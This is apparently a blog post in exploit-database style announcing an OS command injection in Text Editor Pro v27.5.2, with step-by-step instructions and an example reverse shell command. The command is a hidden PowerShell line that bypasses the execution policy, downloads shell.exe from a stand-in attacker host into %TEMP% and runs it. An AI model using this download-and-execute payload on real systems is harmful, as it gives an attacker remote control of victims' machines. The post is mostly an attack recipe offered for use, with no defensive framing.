---
layout: post
title: Text Editor Pro v27.5.2 - OS Command Injection
date: 2023-09-17
category: exploit
---

# Exploit Title: Text Editor Pro v27.5.2 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 17.09.2023
# Vendor Homepage: https://www.texteditor.pro
# Software Link: https://www.texteditor.pro/downloads/TextEditorPro32.exe
# Tested Version: v27.5.2 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open Text Editor Pro.
2. Click on the arrow to the right of **Command Prompt** in the top menu.
3. Select **Properties**, then click on **Insert**.
4. In the opened box, enter your reverse shell command and click **OK**.
5. Save the configuration by clicking **OK** again.
6. Click on the arrow to the right of **Command Prompt** again, and select your configured reverse shell command.
7. Your reverse shell should now be active, connecting to your listener.

### Example of Reverse Shell Command

To set up a reverse shell command, use the following example:

```batch
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://attacker_ip:port -OutFile %TEMP%\shell.exe; Start-Process %TEMP%\shell.exe"
